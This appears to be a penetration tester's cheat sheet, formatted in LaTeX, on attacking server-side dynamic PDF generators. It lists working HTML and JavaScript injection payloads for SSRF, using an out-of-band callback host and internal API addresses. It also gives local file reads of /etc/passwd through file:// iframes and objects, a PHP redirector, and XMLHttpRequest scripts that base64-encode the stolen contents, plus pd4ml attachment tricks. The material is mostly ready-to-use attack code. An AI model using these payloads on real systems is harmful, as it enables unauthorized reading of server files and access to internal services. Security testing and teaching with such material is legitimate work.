
\section{Dynamic PDF}

\subsection{SSRF}


\begin{verbatim}
# to leak for source code lfi
<script> document.write(window.location) </script>

# test SSRF https://app.interactsh.com/
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
<link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
<iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>

# interal API leak
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
\end{verbatim}

\subsubsection{LFI}
without JS exec:
\begin{verbatim}
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">
\end{verbatim}

with hosted redirection:
\begin{verbatim}
#hosted php file
<?php header('Location: file://' . $_GET['url']); ?>

#payload
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
\end{verbatim}



With JS exec
\begin{verbatim}
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>

# base64 same script but
document.write(btoa(this.responseText))

# max 100 chars per line
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}

	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>

\end{verbatim}


Misc pdf tricks:
\begin{verbatim}
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
\end{verbatim}

